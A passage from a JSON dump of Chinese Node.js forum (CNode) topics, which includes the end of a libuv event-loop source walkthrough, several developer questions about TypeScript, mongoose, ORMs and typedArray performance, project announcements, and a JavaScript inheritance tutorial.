uv__loop_alive(const uv_loop_t* loop) {\n  return uv__has_active_handles(loop) ||\n         uv__has_active_reqs(loop) ||\n         loop-&gt;closing_handles != NULL;\n}\n</code></pre><p>这里面做了三类判断，首先是循环结构体（<code>uv_loop_t</code>）中是否还存在活跃句柄（<code>loop-&gt;active_handles</code>）和请求句柄（loop-&gt;active_reqs.count），其次，对未结束的句柄进行了判断如果存在未结束的句柄会在后面的<code>uv__run_closing_handles(loop)</code>进行句柄的unref操作，之后会调用<code>handle-&gt;close_cb(handle);</code>来触发执行close事件回调。</p>\n<h3>timeout赋值之前的判断</h3>\n<p>代码如下：</p>\n<pre class=\"prettyprint language-c\"><code>timeout = 0;\nif ((mode == UV_RUN_ONCE &amp;&amp; !ran_pending) || mode == UV_RUN_DEFAULT)\n  timeout = uv_backend_timeout(loop);\n</code></pre><p><code>timeout</code>变量决定了<code>uv__io_poll</code>的阻塞时长，如果大家翻看过我之前写过的文章，在<a href=\"https://github.com/xtx1130/blog/issues/19\">node源码粗读（8）：setImmediate注册+触发全流程解析</a>的<code>uv_idle简介</code>章节中，详细介绍了<code>timeout</code>部分，在这里我就不做过多讲解了。<br>\n额好吧……在这里再多说一句，<code>!ran_pending</code>会进入到判断中是为了验证其余条件是否满足跳过poll阶段，而如果<code>pending_queue</code>存在的话是可以直接跨过poll阶段的没有必要进入到<code>uv_backend_timeout</code>中做多余的判断，这里是结合了<code>mode == UV_RUN_ONCE &amp;&amp; !ran_pending</code> 所作出的判断。</p>\n<h3>UV_RUN_ONCE模式判断</h3>\n<p>代码如下：</p>\n<pre class=\"prettyprint language-c\"><code>if (mode == UV_RUN_ONCE) {\n  uv__update_time(loop);\n  uv__run_timers(loop);\n}\n</code></pre><p>这个地方是对<code>UV_RUN_ONCE</code>追加的保证<code>uv__io_poll</code>阻塞之后定时器到期所进行的回调。而<code>UV_RUN_NOWAIT</code>则是单纯的为了进行一次i/o轮询，目的性强不保证进度，因此在检查中省略了它。</p>\n<h2>libuv loop-&gt;time 时间计算详解</h2>\n<p>在代码中，大家可以发现，<code>uv__update_time</code>总是伴随着<code>uv__run_timers</code>出现。下面给大家解释下<code>uv__update_time</code>:</p>\n<pre class=\"prettyprint language-c\"><code>UV_UNUSED(static void uv__update_time(uv_loop_t* loop)) {\n  &#x2F;* Use a fast time source if available.  We only need millisecond precision.\n   *&#x2F;\n  loop-&gt;time = uv__hrtime(UV_CLOCK_FAST) &#x2F; 1000000;\n}\n</code></pre><p>在libuv的<code>uv_loop_t</code>结构体中会维护一个<code>time</code>属性，这个<code>loop-&gt;time</code>则是event-loop中用来执行定时任务的时间计算器，每次调用他都会更新出最新的event-loop时间，这个时间则是和<code>uv_timer_t</code>息息相关的，<code>uv_timer_t</code>注册代码如下：</p>\n<pre class=\"prettyprint language-c\"><code>int uv_timer_start(uv_timer_t* handle,\n                   uv_timer_cb cb,\n                   uint64_t timeout,\n                   uint64_t repeat) {\n  uint64_t clamped_timeout;\n\n  if (cb == NULL)\n    return UV_EINVAL;\n\n  if (uv__is_active(handle))\n    uv_timer_stop(handle);\n\n  clamped_timeout = handle-&gt;loop-&gt;time + timeout;\n  if (clamped_timeout &lt; timeout)\n    clamped_timeout = (uint64_t) -1;\n\n  handle-&gt;timer_cb = cb;\n  handle-&gt;timeout = clamped_timeout;\n  handle-&gt;repeat = repeat;\n  &#x2F;* start_id is the second index to be compared in uv__timer_cmp() *&#x2F;\n  handle-&gt;start_id = handle-&gt;loop-&gt;timer_counter++;\n\n  heap_insert(timer_heap(handle-&gt;loop),\n              (struct heap_node*) &amp;handle-&gt;heap_node,\n              timer_less_than);\n  uv__handle_start(handle);\n\n  return 0;\n}\n</code></pre><p>通过<code>clamped_timeout = handle-&gt;loop-&gt;time + timeout;</code>这段代码可以发现，<code>uv__run_timers</code>真正的运行时间是<code>loop-&gt;time</code>（<code>uv_timer_t</code>句柄注册时的event-loop时间）+ <code>timeout</code>（延迟触发时间）。</p>\n<h2>setTimeout和setImmediate</h2>\n<p>在nodejs中，如果你输入如下代码：</p>\n<pre class=\"prettyprint language-js\"><code>setTimeout(()=&gt;console.log(0))\nsetImmediate(()=&gt;console.log(1))\n</code></pre><p>会发现输出顺序是随机的，接下来给大家详细解释一下这里的随机性，视线首先转移到<code>setTimeout</code>的实现原理[internal/timers.js]中：</p>\n<pre class=\"prettyprint language-js\"><code>function Timeout(callback, after, args, isRepeat) {\n  after *= 1; &#x2F;&#x2F; coalesce to number or NaN\n  if (!(after &gt;= 1 &amp;&amp; after &lt;= TIMEOUT_MAX)) {\n    &#x2F;&#x2F; ...\n    after = 1; &#x2F;&#x2F; schedule on next tick, follows browser behavior\n  }\n  &#x2F;&#x2F; ...\n}\n</code></pre><p>在这里对<code>setTimeout</code>的延迟时间做了判定，如果没有设定延迟时间则会默认为<strong>1毫秒</strong>的延迟触发。继而延伸到libuv，在event-loop的<code>uv__run_timers</code>中调用<code>handle-&gt;timer_cb(handle)</code>来触发回调。在<a href=\"https://github.com/xtx1130/blog/issues/19\">node源码粗读（8）：setImmediate注册+触发全流程解析</a>的<code>setImmediate的执行</code>章节中，详细介绍了<code>setImmediate</code>的执行机制，<code>setImmediate</code>是在<code>uv__run_check</code>阶段触发。<br>\n在libuv进行初始化的过程中，如果时间小于1毫秒，则会直接跳过<code>uv__run_timers</code>使得<code>uv__run_check</code>中的回调队列优先触发；而如果初始化时间大于1毫秒，则会进入到<code>uv__run_timers</code>阶段优先触发<code>setTimeout</code>中的回调。</p>\n<p>原文地址：<a href=\"https://github.com/xtx1130/blog/issues/35%EF%BC%8C%E5%A6%82%E6%9E%9C%E5%85%B6%E4%B8%AD%E5%86%85%E5%AE%B9%E6%9C%89%E8%AF%AF%EF%BC%8C%E6%AC%A2%E8%BF%8E%E5%A4%A7%E7%A5%9E%E6%96%A7%E6%AD%A3\">https://github.com/xtx1130/blog/issues/35，如果其中内容有误，欢迎大神斧正</a></p>\n</div>","title":"libuv源码粗读（6）：libuv event-loop详解","last_reply_at":"2019-03-18T12:04:53.424Z","good":false,"top":false,"reply_count":0,"visit_count":442,"create_at":"2019-03-18T12:04:53.424Z","author":{"loginname":"xtx1130","avatar_url":"https://avatars2.githubusercontent.com/u/5475069?v=4&s=120"}},{"id":"5c8f5ac67ce0df37324295ea","author_id":"5b7fcf90a210553a0cde2be0","tab":"ask","content":"<div class=\"markdown-text\"><p>如题。\n因为项目中使用了一个github上的第三方库，其中有一些内容很久没有更新，所以我做了些改动。\n一开始是用npm引用本地库的方法，来使用这个修改过的库。\n但是目前发现这种方式在npm install 部署的时候经常出问题，时常报File not Found。\n所以现在尝试直接把这个库的文件copy进当前项目，并且写了.d.ts。问题在使用 ///&lt;reference path=&quot;&quot;/&gt; 的时候，程序会报Cannot find moudle\n看上去应该是因为ts不会直接读取.d.ts所在的目录，而是会在node_modules 里找</p>\n</div>","title":"typescript怎么使用本地javascript库的.d.ts文件？","last_reply_at":"2019-03-18T10:43:11.513Z","good":false,"top":false,"reply_count":4,"visit_count":455,"create_at":"2019-03-18T08:45:58.387Z","author":{"loginname":"pkoukk","avatar_url":"https://avatars2.githubusercontent.com/u/21674009?v=4&s=120"}},{"id":"5c89bf507ce0df3732427c74","author_id":"57c92f432adfc63a26784431","tab":"ask","content":"<div class=\"markdown-text\"><p>一个请求，肯定会有查N次查询，进行各种判断逻辑，逻辑应该放在哪里做？\nA.使用存储过程直接干\nB.简单的能用orm用orm，不能的手写查询，然后转化成model实例\nB.完全不用/少用join，按照条件查出来本地处理\nC.先查相关记录的id，然后用orm去取。根据需要加meta表，计算逻辑全在meta表里面，也方便加orm的缓存\nD.不用orm，纯手工</p>\n<p>然后就是事务在实际场景到底怎么用\n需要操作多个service层的时候很可能就用到事务，在写的时候是该把事务一层层传下去吗，还是不用事务？或者使用cls-hooked这种东西？\n还有如果用事务的话，里面可能有一些逻辑，然后比较耗时，然后长期占用了连接池，导致后面的请求处理不了</p>\n</div>","title":"业务逻辑应该放在sql里面吗？以及事务到底该怎么用？","last_reply_at":"2019-03-18T10:14:05.768Z","good":false,"top":false,"reply_count":9,"visit_count":728,"create_at":"2019-03-14T02:41:20.051Z","author":{"loginname":"Shonke","avatar_url":"https://avatars.githubusercontent.com/u/9344384?v=3&s=120"}},{"id":"5c8f5d487ce0df3732429618","author_id":"5bf12bb1be1b120abac5a88b","tab":"share","content":"<div class=\"markdown-text\"><p>Express Koa结合GraphQl实现服务器端Api教程:</p>\n<p><a href=\"https://www.bilibili.com/video/av45212222?from=search&amp;seid=2268749945407499008\">https://www.bilibili.com/video/av45212222?from=search&amp;seid=2268749945407499008</a></p>\n</div>","title":"分享一个Express Koa结合GraphQl实现服务器端Api的教程  -b站直接看","last_reply_at":"2019-03-18T09:10:29.548Z","good":false,"top":false,"reply_count":2,"visit_count":447,"create_at":"2019-03-18T08:56:40.233Z","author":{"loginname":"eggper","avatar_url":"https://avatars3.githubusercontent.com/u/44997460?v=4&s=120"}},{"id":"5c8f54d6acb681372d41977a","author_id":"5191130b63e9f8a542b1a193","tab":"share","content":"<div class=\"markdown-text\"><p><img src=\"//static.cnodejs.org/FtOZxHaPRcNaqwpnfawwE17Pz-CH\" alt=\"bgline.png\"></p>\n<blockquote>\n<p><a href=\"https://github.com/efoxTeam/flutter-ui\">项目仓库</a> 目前项目组件还在不断更新中…<br>\n当github仓库更新后 教程会实时更新到app里面 <a href=\"https://github.com/efoxTeam/flutter-ui/releases\">apk下载</a> 欢迎对组件疑问提出你的<a href=\"https://github.com/efoxTeam/flutter-ui/issues\">issue</a></p>\n</blockquote>\n<h2>项目背景</h2>\n<p>在经历了REACT NATIVE 弃用潮的大环境里，越来越多人寻找着可替代方案<br>\nFlutter 应该是目前比较热门的一项技术 —— 高效的开发效率，一套代码可以支持 Android/iOS 双端运行，Google 新的操作系统 Fuchsia 的默认 UI Toolkit 等等，都吸引了开发者社区大量的关注。<br>\n目前中国环境使用Flutter开发的案例并不多，作为一支尝鲜的团队，我们利用flutter很好地推动项目快速运转，也整理了部分开发经验！</p>\n<h2>项目优势</h2>\n<blockquote>\n<p>从开发到开源整理项目课程，我们经历了几次的迭代，汇集了react的开发经验，架构出适合开源教程的开源App</p>\n</blockquote>\n<ol>\n<li>动态更新，我们通过md的更新PR 可以动态实现app内文档更新，可以持续动态更新而不需要重新发版</li>\n<li>多语言埋点，为了更好跟国际接轨，我们实现了通过JSON达到了多语言切换的效果</li>\n<li>多主题预埋点，我们通过统一管理样式的方式进行编码，方便后续进行多主题切换</li>\n<li>Scope Model数据管理应用，达到了UI,数据，控制分离的目的</li>\n</ol>\n<h2>预览</h2>\n<p><img src=\"https://user-gold-cdn.xitu.io/2019/3/15/169816f11b802214?w=280&amp;h=498&amp;f=gif&amp;s=128620\" alt> <img src=\"https://user-gold-cdn.xitu.io/2019/3/15/169816f11c691e97?w=280&amp;h=498&amp;f=gif&amp;s=194491\" alt></p>\n<h2>最后</h2>\n<p>希望一起参与建设中文社区的同学可以查看<a href=\"https://github.com/efoxTeam/flutter-ui/blob/master/readme/pr.md\">开发者如何参与完善控件</a></p>\n</div>","title":"Flutter UI APP 发布","last_reply_at":"2019-03-18T08:20:38.256Z","good":false,"top":false,"reply_count":0,"visit_count":551,"create_at":"2019-03-18T08:20:38.256Z","author":{"loginname":"ckken","avatar_url":"https://avatars3.githubusercontent.com/u/3890513?v=4&s=120"}},{"id":"5c8f4fafacb681372d419740","author_id":"5ad86092a7d228c16b987042","tab":"ask","content":"<div class=\"markdown-text\"><p>服务端的代码有必要做uglify吗？</p>\n</div>","title":"node uglify","last_reply_at":"2019-03-18T07:58:39.702Z","good":false,"top":false,"reply_count":0,"visit_count":346,"create_at":"2019-03-18T07:58:39.702Z","author":{"loginname":"dingyuanwu","avatar_url":"https://avatars0.githubusercontent.com/u/27721756?v=4&s=120"}},{"id":"5c8f4dc17ce0df373242955c","author_id":"50b5bc5d637ffa4155091236","tab":"ask","content":"<div class=\"markdown-text\"><p><a href=\"https://cnodejs.org/api\">https://cnodejs.org/api</a>\n这上面没找到</p>\n</div>","title":"cnodejs有发帖的api吗？","last_reply_at":"2019-03-18T07:50:25.592Z","good":false,"top":false,"reply_count":0,"visit_count":342,"create_at":"2019-03-18T07:50:25.592Z","author":{"loginname":"yakczh","avatar_url":"https://avatars3.githubusercontent.com/u/6591466?v=4&s=120"}},{"id":"5c8efef07ce0df3732429130","author_id":"5c1c411f76c4964062a1c0e3","tab":"share","content":"<div class=\"markdown-text\"><p>参照2048.cpp，写了个2048 node版。\n一个可以直接在终端玩2048游戏的项目。</p>\n<p><a href=\"https://github.com/bestvist/2048.node\">github项目地址</a></p>\n<p>全局安装</p>\n<pre class=\"prettyprint\"><code>npm i -g 2048.node\n</code></pre><p>启动</p>\n<pre class=\"prettyprint\"><code>2048node\n</code></pre><p><img src=\"//static.cnodejs.org/Fo0YkTHfgUsu-_DE5PJqcmINa6QZ\" alt=\"demo.gif\"></p>\n</div>","title":"node版2048，休闲娱乐必备","last_reply_at":"2019-03-18T07:22:58.303Z","good":false,"top":false,"reply_count":3,"visit_count":554,"create_at":"2019-03-18T02:14:08.138Z","author":{"loginname":"bestvist","avatar_url":"https://avatars2.githubusercontent.com/u/22828569?v=4&s=120"}},{"id":"5c8b73c67ce0df373242864e","author_id":"5c8b6df0acb681372d4187f8","tab":"share","content":"<div class=\"markdown-text\"><p>Hi,  CNoders</p>\n<p>不知道大家对量化交易是否有兴趣。我们最近发布了一个基于 TypeScript/JavaScript 的量化交易系统  <a href=\"https://bladehub.io/\">BladeHub倍恒量化</a></p>\n<p>项目源于自己做量化策略发现，已有的系统过于繁杂老旧，新平台则功能过于单一、不完善。</p>\n<p>希望以当前优秀互联网产品体验的标准开发一款门槛更低，并且功能更丰富“时尚”的量化交易工具。</p>\n<p>BladeHub 的特点：</p>\n<ol>\n<li>开箱即用。支持代码高亮的策略编辑器，完整的回测工具和实用的可视化策略调试工具</li>\n<li>简洁易用的 API。系统内对交易所、交易对在内的交易概念、交易数据类型和交易所接口进行了统一和简化</li>\n<li>使用  JavaScript</li>\n<li>事件驱动</li>\n<li>策略文件保存在本地，私有、安全</li>\n</ol>\n<p>目前支持了主流的数字货币的交易所，美股、股指期货正在对接。开源的工作也在进行中。</p>\n<p>Gitter：<a href=\"https://gitter.im/BladeHubCN/community\">https://gitter.im/BladeHubCN/community</a></p>\n<p>微信：bladehub002</p>\n<p>文档：<a href=\"https://github.com/bladehubdocs/bladehub-doc-cn/wiki\">https://github.com/bladehubdocs/bladehub-doc-cn/wiki</a></p>\n<p>主页：<a href=\"https://bladehub.io/\">https://bladehub.io/</a> 倍恒量化</p>\n<p>有啥量化问题或者其他吐槽大家可以帖子下面交流，或者加入量化交流微信群/gitter。我们会陆续分享一些量化的小心得，也欢迎大家一起交流</p>\n<p>微信群二维码\n<img src=\"//static.cnodejs.org/Fjws5mrSM9Kf7ngofrSC3ql0q52e\" alt=\"group.png\"></p>\n<p>群二维码过期可以添加我们的微信号来拉你进群交流\n<img src=\"//static.cnodejs.org/FiQvi-0TZ8rWIzy9s_SfjhxsNkd0\" alt=\"support.png\"></p>\n</div>","title":"分享一个量化策略开发工具，可以用 TypeScript/JavaScript 做策略开发（后端当然是用的 node.js😎）","last_reply_at":"2019-03-18T04:02:00.966Z","good":false,"top":false,"reply_count":4,"visit_count":567,"create_at":"2019-03-15T09:43:34.517Z","author":{"loginname":"yaway","avatar_url":"https://avatars2.githubusercontent.com/u/844157?v=4&s=120"}},{"id":"5c8f08b77ce0df37324291f1","author_id":"595e01c9a4de5625080fe14d","tab":"ask","content":"<div class=\"markdown-text\"><p>如题</p>\n<p>使用了 nest.js，driver 用的是 mongoose。发现连接本地的 MongoDB 直接使用 mongodb://hostName:port/dbName 连接没有问题。但是连接 RDS 的分片集群貌似一定要连接 admin 表进行验证，否则就会 authentication failed。有大佬知道怎么解决吗</p>\n<p>阿里云给出的 Connection URI 是这样的格式，应用中直接用这个连验证没有问题，但是不知道如何连接自定义的表\nmongodb://root:password@dds-xxx.mongodb.rds.aliyuncs.com:3717,<a href=\"http://dds-xxx.mongodb.rds.aliyuncs.com:3717/admin?replicaSet=rsName\">dds-xxx.mongodb.rds.aliyuncs.com:3717/admin?replicaSet=rsName</a></p>\n</div>","title":"如何使用 mongoose 连接阿里云 RDS 分片集群","last_reply_at":"2019-03-18T03:54:43.475Z","good":false,"top":false,"reply_count":3,"visit_count":310,"create_at":"2019-03-18T02:55:51.792Z","author":{"loginname":"dogrod","avatar_url":"https://avatars2.githubusercontent.com/u/21096842?v=4&s=120"}},{"id":"5c8e2e0d7ce0df3732428e18","author_id":"5aa77f8ef5dfc27d7ad98773","tab":"ask","content":"<div class=\"markdown-text\"><ol>\n<li>array在js中的实现是用哈希映射，其读取与插入效率都比较慢，于是出现了typedArray，开辟一整块连续的内存供开发者使用。</li>\n<li>上述代码为测试结果，在node 8.10.1 上跑的结果第1，2，4 个代码块都正常，（1,2,4 分别为相同数据类型的读取，相同数据类型的插入，不同数据类型的插入）array比typedArray慢。但是第三个代码块（第三个代码块为不同类型的读取）就差距不是很多了，甚至typedArray比array还要慢一些。</li>\n<li>下面为测试代码：</li>\n</ol>\n<pre class=\"prettyprint\"><code>{\n    &#x2F;&#x2F; 相同类型数组的读取\n    const arrLength = 50000000;\n    const arr = new Array(arrLength);\n    arr.fill(123);\n    let value_1;\n    console.time(&#x27;array&#x27;);\n    for(let i = 0; i &lt; arr.length; i++) {\n        value_1 = arr[i];\n    }\n    console.timeEnd(&#x27;array&#x27;); \n    &#x2F;&#x2F; arrayBuffer的读取\n    const arrBuffer = new ArrayBuffer(4 * arrLength);\n    const int32Arr = new Int32Array(arrBuffer); \n    int32Arr.fill(123);\n    let value_2;\n    console.time(&#x27;int32Arr&#x27;);\n    for (let i = 0 ; i &lt; int32Arr.length; i++) {\n        value_2 = int32Arr[i];\n    }\n    console.timeEnd(&#x27;int32Arr&#x27;);\n}\n\n{\n    &#x2F;&#x2F; 相同类型数组的插入\n    const arrLength = 50000000;\n    const arr = new Array(arrLength);\n    console.time(&#x27;array&#x27;);\n    for(let i = 0 ; i &lt; arr.length; i++) {\n        arr[i] = i;\n    }\n    console.timeEnd(&#x27;array&#x27;); \n    &#x2F;&#x2F; arrayBuffer的插入\n    const arrBuffer = new ArrayBuffer(4 * arrLength);\n    const int32Arr = new Int32Array(arrBuffer); \n    console.time(&#x27;int32Arr&#x27;);\n    for (let i= 0 ; i &lt; int32Arr.length; i++) {\n        int32Arr[i] = i;\n    }\n    console.timeEnd(&#x27;int32Arr&#x27;); \n}\n\n\n{\n    &#x2F;&#x2F; 不同数据类型的读取\n    const arrLength = 50000000;\n    const arr = new Array(arrLength);\n    arr.fill(123);\n    arr[0] = &#x27;234&#x27;;\n    let value_1;\n    console.time(&#x27;array&#x27;);\n    for(let i = 0 ; i &lt; arr.length; i++) {\n        value_1 = arr[i];\n    }\n    console.timeEnd(&#x27;array&#x27;); \n    &#x2F;&#x2F; arrayBuffer的读取\n    const arrBuffer = new ArrayBuffer(4 * arrLength);\n    const int32Arr = new Int32Array(arrBuffer); \n    int32Arr.fill(123);\n    int32Arr[0] = &#x27;234&#x27;;\n    let value_2;\n    console.time(&#x27;int32Arr&#x27;);\n    for (let i = 0; i &lt; int32Arr.length; i++) {\n        value_2 = int32Arr[i];\n    }\n    console.timeEnd(&#x27;int32Arr&#x27;);\n    &#x2F;&#x2F; 不同类型的情况下,arrayBuffer 的插入速度与array差不多\n}\n\n{\n    &#x2F;&#x2F; 不同类型的插入\n    const arrLength = 50000000;\n    const arr = new Array(arrLength);\n    arr[0] = &#x27;234&#x27;;\n    console.time(&#x27;array&#x27;);\n    for(let i = 1 ; i &lt; arr.length; i++) {\n        arr[i] = i;\n    }\n    console.timeEnd(&#x27;array&#x27;); \n    &#x2F;&#x2F; arrayBuffer的插入\n    const arrBuffer = new ArrayBuffer(4 * arrLength);\n    const int32Arr = new Int32Array(arrBuffer); \n    int32Arr[0] = &#x27;234&#x27;;\n    console.time(&#x27;int32Arr&#x27;);\n    for (let i= 1 ; i &lt; int32Arr.length; i++) {\n        int32Arr[i] = i;\n    }\n    console.timeEnd(&#x27;int32Arr&#x27;); \n    &#x2F;&#x2F; 不同类型的情况下, arrayBuffer 的插入速度比array快,但是第一项数据丢失,(因为声明的是int类型的)存储的为0;\n}\n</code></pre><ol>\n<li>以下是运行结果贴图：\n<img src=\"//static.cnodejs.org/FuH-23xy5Lsma8Tl4XDzFh-ZSJUt\" alt=\"dest.png\">\n希望有了解的大神给我解答一下心中的疑惑… 不胜感激…<br>\n路漫漫…</li>\n</ol>\n</div>","title":"typedArray 与 array 的读取与插入速度问题","last_reply_at":"2019-03-18T02:07:05.283Z","good":false,"top":false,"reply_count":2,"visit_count":281,"create_at":"2019-03-17T11:22:53.886Z","author":{"loginname":"Helovebai","avatar_url":"https://avatars1.githubusercontent.com/u/26702657?v=4&s=120"}},{"id":"5c8cc6feacb681372d418be3","author_id":"53f1d352bbdaa79d51143756","tab":"ask","content":"<div class=\"markdown-text\"><p>有知道的大神麻烦告知一下，谢谢。</p>\n</div>","title":"Mongoose 如何对内嵌文档（子文档）进行分页查询？","last_reply_at":"2019-03-18T01:58:34.543Z","good":false,"top":false,"reply_count":2,"visit_count":512,"create_at":"2019-03-16T09:50:54.129Z","author":{"loginname":"snowdream","avatar_url":"https://avatars3.githubusercontent.com/u/737958?v=4&s=120"}},{"id":"5c8e41297ce0df3732428e7d","author_id":"5a0a5c9da57c17282e120654","tab":"share","content":"<div class=\"markdown-text\"><p><img src=\"https://user-gold-cdn.xitu.io/2019/3/17/1698bac5de7ee8fe?w=1335&amp;h=909&amp;f=png&amp;s=980786\" alt=\"20190317203439.png\"></p>\n<p>最近回顾 js 继承的时候，发现还是对一些概念不是很清晰。这里再梳理一下 JS 中继承的几种主要的方式，构造函数继承、原型链继承、组合继承以及原型式继承、寄生式继承、寄生组合式继承和 ES6 的 Class：</p>\n<h2>构造函数继承</h2>\n<p>构造函数继承没有用到 prototype 这种方式比较常见，定义和使用也较为简单，下面是一个例子🌰：</p>\n<ul>\n<li>👍 可以定义私有属性方法</li>\n<li>👍 子类可以传递参数给父类</li>\n<li>❌ 不能定义共享属性方法/或写在外面失去了封装性</li>\n</ul>\n<pre class=\"prettyprint language-js\"><code>function Parent(name, friends) {\n    this.name = name\n    this.friends = friends &#x2F;&#x2F; 👍 可以定义私有 引用类型不会被共享\n    this.share = share &#x2F;&#x2F; ❌ 可以定义公有 但需要放在外部\n    this.log = log &#x2F;&#x2F; ❌ 避免重复声明，为了复用需要放在外面\n}\n&#x2F;&#x2F; ❌ 公有属性和方法定义在外面失去了封装性\nlet share = [1, 2, 3]\nfunction log() {\n    return this.name\n}\n\nfunction Child(name, friends, gender) {\n    Parent.call(this, name, friends) &#x2F;&#x2F; 👍 可以在子类传递参数给父类\n    this.gender = gender\n}\n</code></pre><p><img src=\"https://user-gold-cdn.xitu.io/2019/3/17/1698bac5df93d826?w=871&amp;h=117&amp;f=png&amp;s=13490\" alt=\"20190317153141.png\"></p>\n<h2>原型链继承</h2>\n<p>原型链模式需要手动重新绑定 constructor 而且不能定义私有变量</p>\n<ul>\n<li>👍 可以定义公有属性方法</li>\n<li>❌ 无论是定义还是继承都需要手动修改 constructor</li>\n<li>❌ 封装性一般</li>\n<li>❌ 不能定义私有属性方法</li>\n<li>❌ 没办法向父类传递参数</li>\n</ul>\n<pre class=\"prettyprint language-js\"><code>function Parent() {}\nParent.prototype = {\n    constructor: Parent, &#x2F;&#x2F; ❌ 需要手动绑定 constructor\n    name: &#x27;oli&#x27;, &#x2F;&#x2F; ❌ 不能定义私有属性，全部都是公有\n    friends: [&#x27;alice&#x27;, &#x27;troy&#x27;], &#x2F;&#x2F; 👍 可以定义公有属性 所有实例都引用这个\n    log: function() { &#x2F;&#x2F; 👍 方法被共享了\n        return this.name\n    }\n}\n&#x2F;&#x2F; 也可以写成多个 Parent.prototype.func1 = function(){} 封装性更差 但不用修改 constructor\n&#x2F;&#x2F; ❌ 封装性一般\n\nfunction Child() {} &#x2F;&#x2F; ❌ 没办法向父类传递参数\nChild.prototype = new Parent() &#x2F;&#x2F; 使用 new 操作符创建并重写 prototype\nChild.prototype.constructor = Child &#x2F;&#x2F; ❌ 每次继承都需要手动修改 constructor 谁叫你是覆盖 prototype 属性呢\n</code></pre><p><img src=\"https://user-gold-cdn.xitu.io/2019/3/17/1698bac5dfb4e812?w=942&amp;h=157&amp;f=png&amp;s=18888\" alt=\"20190317164208.png\"></p>\n<h2>组合继承</h2>\n<p>上面两者结合即成为组合继承模式，这个是结合了两者的优势，在 ES6 的 class 出现之前的常用方法，🦐🍜看看例子：</p>\n<ul>\n<li>👍 公有的写在原型</li>\n<li>👍 私有的写在构造函数</li>\n<li>👍 可以向父类传递参数</li>\n<li>❌ 需要手动绑定 constructor</li>\n<li>❌ 封装性一般</li>\n<li>⚡ 重复调用父类性能损耗</li>\n</ul>\n<pre class=\"prettyprint language-js\"><code>function Parent(name, friends) {\n    &#x2F;&#x2F; 😀 私有的写这里\n    this.name = name &#x2F;&#x2F; 👍 可以定义私有属性\n    this.friends = friends &#x2F;&#x2F; 👍 可以定义公有引用属性不会被共享\n}\nParent.prototype = {\n    &#x2F;&#x2F; 😀 公有的写这里\n    constructor: Parent, &#x2F;&#x2F; ❌ 需要手动绑定 constructor\n    share: [1, 2, 3], &#x2F;&#x2F; 👍 这里定义的公有属性会被共享\n    log: function() { &#x2F;&#x2F; 👍 方法被共享了\n        return this.name\n    }\n}\n&#x2F;&#x2F; ❌ 封装性一般\n\nfunction Child(name, friends, gender) {\n    Parent.call(this, name, friends) &#x2F;&#x2F; 👍 可以向父类传递参数 ⚡ 这里又调用了一次 Parent\n    this.gender = gender\n}\nChild.prototype = new Parent() &#x2F;&#x2F; 使用 new 操作符创建并重写 prototype ⚡ 这里调用了一次 Parent\n&#x2F;&#x2F; 有方法避免多次调用直接去掉 new 操作符 转而写成 Child.prototype = Parent.prototype 这样并不好，虽然避免出现重复调用但导致修改子类 constructor 的时候父类也被修改了\nChild.prototype.constructor = Child &#x2F;&#x2F; ❌ 每次继承都需要手动修改 constructor 谁叫你是覆盖 prototype 属性呢\n&#x2F;&#x2F; 如果使用 Child.prototype = Parent.prototype 那么 constructor 子类父类是同一个\n</code></pre><p><img src=\"https://user-gold-cdn.xitu.io/2019/3/17/1698bac5dfd6c0b6?w=637&amp;h=125&amp;f=png&amp;s=12823\" alt=\"20190317171213.png\"></p>\n<h2>原型式继承</h2>\n<p>原型式继承直接使用 ES5 <code>Object.create</code> 方法，该方法的原理是创建一个构造函数，构造函数的原型指向对象，然后调用 new 操作符创建实例，并返回这个实例，本质是一个浅拷贝</p>\n<ul>\n<li>👍 父类方法可以复用</li>\n<li>❌ 父类引用属性全部被共享</li>\n<li>❌ 子类不可传递参数给父类</li>\n</ul>\n<pre class=\"prettyprint language-js\"><code>let parent = {\n    name: &#x27;parent&#x27;,\n    share: [1, 2, 3], &#x2F;&#x2F; ❌ 父类的引用属性全部被子类所共享\n    log: function() { &#x2F;&#x2F; 👍 父类方法可以复用\n        return this.name\n    }\n}\n\nlet child = Object.create(parent) &#x2F;&#x2F; ❌ 子类不能向父类传递参数\n</code></pre><p><img src=\"https://user-gold-cdn.xitu.io/2019/3/17/1698bac5dfecdeab?w=520&amp;h=96&amp;f=png&amp;s=8410\" alt=\"20190317183345.png\"></p>\n<h2>寄生式继承</h2>\n<p>原型式继承的基础上为子类增加属性和方法</p>\n<ul>\n<li>👍 父类方法可以复用</li>\n<li>👍 增加了别的属性和方法</li>\n<li>❌ 父类引用属性全部被共享</li>\n<li>❌ 子类不可传递参数给父类</li>\n</ul>\n<pre class=\"prettyprint language-js\"><code>let parent = {\n    name: &#x27;parent&#x27;,\n    share: [1, 2, 3],\n    log: function() {\n        return this.name\n    }\n}\n\nfunction create(obj) {\n    let clone = Object.create(obj) &#x2F;&#x2F; 本质上还是 Object.create\n    clone.print = function() { &#x2F;&#x2F; 增加一些属性或方法\n        console.log(this.name)\n    }\n    return clone\n}\n\nlet child = create(parent)\n</code></pre><h2>寄生组合式继承</h2>\n<p>杂糅了原型链式、构造函数式、组合式、原型式、寄生式而形成的一种方式：</p>\n<p>组合继承的方法会调用两次 Parent，一次是在 <code>Child.prototype = new Parent()</code> ，一次是在 <code>Parent.call()</code>。这个是组合继承的唯一缺点，寄生组合式解决了这个问题：</p>\n<ul>\n<li>👍 公有的写在原型</li>\n<li>👍 私有的写在构造函数</li>\n<li>👍 可以向父类传递参数</li>\n<li>👍 不会重复调用父类</li>\n<li>❌ 需要手动绑定 constructor （如果重写 prototype）</li>\n<li>❌ 需要调用额外的方法封装性一般</li>\n</ul>\n<pre class=\"prettyprint language-js\"><code>function Parent(name, friends) {\n    this.name = name\n    this.friends = friends\n}\nParent.prototype = {\n    constructor: Parent, &#x2F;&#x2F; ❌ 需要手动绑定 constructor\n    share: [1, 2, 3],\n    log: function() {\n        return this.name\n    }\n}\n\nfunction Child(name, friends, gender) {\n    Parent.call(this, name, friends) &#x2F;&#x2F; ⚡ 这里只需要调用一次 Parent\n    this.gender = gender\n}\n&#x2F;&#x2F; 上半部分和组合继承一样\n\nlet F = function() {} &#x2F;&#x2F; 创建一个中介函数\nF.prototype = Parent.prototype &#x2F;&#x2F; 这个中介的原型指向 Parent 的原型\nChild.prototype = new F() &#x2F;&#x2F; 注意这里没有使用 new 操作符调用 Parent\nChild.prototype.constructor = Child\n</code></pre><p>对上述方法进行一个封装：</p>\n<pre class=\"prettyprint language-js\"><code>function Parent(name, friends) {\n    this.name = name &#x2F;&#x2F; 👍 可以定义私有属性\n    this.friends = friends 